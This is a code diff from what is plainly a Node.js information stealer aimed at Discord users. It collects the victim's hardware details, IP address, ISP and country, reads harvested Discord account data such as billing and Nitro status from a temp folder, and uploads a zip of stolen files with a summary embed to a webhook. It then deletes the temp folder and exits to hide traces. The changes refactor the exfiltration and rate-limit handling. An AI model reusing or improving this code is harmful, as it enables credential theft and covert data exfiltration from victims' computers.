@@ -9,14 +9,14 @@ const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
 const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar, usernameFormat } = require('../util/discord-account');
-const { sleep } = require('../util/general');
 const { getNameAndVersion } = require('../util/os');
 const { getTempFolder } = require('../util/init');
+const DiscordAPI = require('../util/discord-api');
+
+const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
+const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
 
 const json = async (zipFile) => {
-  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
-  const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
-
   const computerInfoFields = [
     ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB'],
     ['💾 CPUs', [...new Set(os.cpus().map(cpu => cpu.model.trim()))].join(', ')],
@@ -33,17 +33,16 @@ const json = async (zipFile) => {
     ['ISP', code(await ipInfo('isp'))],
     ['🏴 Country', await ipInfo('country') + ' :flag_' + (await ipInfo('countryCode')).toLowerCase() + ':'],
   ];
-
   const embeds = [];
+  const fieldsMap = f => ({ name: f[0], value: f[1], inline: typeof f[2] !== 'undefined' ? f[2] : true });
+
   embeds.push({
     description: 'Taken ' + Math.floor((Date.now() - startTime) / 1000) + ' seconds',
     fields: [
       { name: '💻 Computer Info', value: computerInfoFields.map(i => `${i[0]}: ${i[1]}`).join('\n'), inline: true },
-      { name: 'IP Info', value: ipInfoFields.map(i => `${i[0]}: ${i[1]}`).join('\n'), inline: true },
+      { name: '📍 IP Info', value: ipInfoFields.map(i => `${i[0]}: ${i[1]}`).join('\n'), inline: true },
     ]
   });
-
-  const fieldsMap = f => ({ name: f[0], value: f[1], inline: typeof f[2] !== 'undefined' ? f[2] : true });
 
   if (fs.existsSync(join(getTempFolder(), 'Discord.json'))) {
     const discordAccountInfo = JSON.parse(readFileSync(join(getTempFolder(), 'Discord.json')).toString());
@@ -282,40 +281,41 @@ const json = async (zipFile) => {
   };
 };
 
-const send = async (zipFile) => {
-  if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
-
-  const data = new FormData();
-  data.append('files[0]', fs.createReadStream(zipFile));
-  data.append('payload_json', JSON.stringify(await json(zipFile?.split(sep)?.pop())));
-
-  const deleteFiles = async () => {
-    try {
-      await rmSync(getTempFolder(), { recursive: true, force: true });
-    } catch (e) {
-      await deleteFiles();
-    }
-  };
+const deleteFiles = async () => {
   try {
-    await axios.post(webhook.url, data, {
-      headers: { 'Content-Type': 'multipart/form-data' },
-    });
+    rmSync(getTempFolder(), { recursive: true, force: true });
+  } catch (e) {
+    await deleteFiles();
+  }
+};
+
+const sendToWebhook = async (data) => {
+  try {
+    await (new DiscordAPI()).sendToWebhook(data);
     await deleteFiles();
     process.exit(0);
   } catch (err) {
-    if (err.response?.data) {
-      if (
-        err.response.status === 429 &&
-        err.response.data.message?.includes('You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently.')
-      ) {
-        await deleteFiles();
-        process.exit(0);
-      } else if (err.response.status === 429 && err.response.data?.retry_after) {
-        await sleep((err.response.data.retry_after * 1000) + 500);
-        await send(zipFile);
-      }
+    if (!err.response || !err.response?.data) return;
+    if (err.response.status === 429 && !('retry_after' in err.response.data)) {
+      await deleteFiles();
+      process.exit(0);
     }
   }
+};
+
+const send = async (zipFile) => {
+  if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
+
+  let jsonData = await json(zipFile?.split(sep)?.pop());
+  if (jsonData.embeds.length > 10) {
+    jsonData = jsonData.embeds.slice(0, 10);
+  }
+
+  const data = new FormData();
+  data.append('files[0]', fs.createReadStream(zipFile));
+  data.append('payload_json', JSON.stringify(jsonData));
+
+  await sendToWebhook(data);
 };
 
 module.exports = send;
